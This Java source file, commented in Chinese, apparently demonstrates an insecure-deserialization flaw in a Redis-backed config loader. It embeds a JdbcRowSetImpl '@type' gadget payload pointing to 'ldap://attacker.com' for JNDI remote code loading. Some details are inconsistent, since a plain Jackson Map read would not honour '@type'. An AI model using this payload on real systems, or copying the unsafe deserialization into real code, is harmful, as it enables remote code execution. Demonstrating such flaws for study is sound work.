import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.data.redis.core.StringRedisTemplate;
import java.util.Map;
import java.util.stream.Collectors;

@FunctionalInterface
interface ConfigProcessor {
    Map<String, Object> process(String configData);
}

public class DataCleaner {
    private static final ObjectMapper mapper = new ObjectMapper();
    private final StringRedisTemplate redisTemplate;

    public DataCleaner(StringRedisTemplate redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    public static void main(String[] args) {
        // 模拟Spring上下文注入
        StringRedisTemplate redis = new StringRedisTemplate();
        DataCleaner cleaner = new DataCleaner(redis);
        
        // 恶意攻击者通过Redis写入恶意序列化数据
        String maliciousPayload = "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com\\",\\"autoCommit\\":true}";
        redis.opsForValue().set("auth:config", maliciousPayload);
        
        // 触发漏洞的函数式调用链
cleaner.getConfigAuthProviderConfig("auth:config")
            .map(config -> (Map<String, Object>) config.get("data"))
            .ifPresent(data -> System.out.println("Processed config: " + data.keySet()));
    }

    public java.util.Optional<Map<String, Object>> getConfigAuthProviderConfig(String key) {
        return java.util.Optional.ofNullable(redisTemplate.opsForValue().get(key))
            .map(JsonUtils::deserialize);
    }
}

class JsonUtils {
    // 不安全的反序列化实现
    public static Map<String, Object> deserialize(String json) {
        try {
            // 未限制反序列化类型，启用多态类型处理
            return DataCleaner.mapper.readValue(json, Map.class);
        } catch (JsonProcessingException e) {
            throw new RuntimeException("Invalid config format", e);
        }
    }
}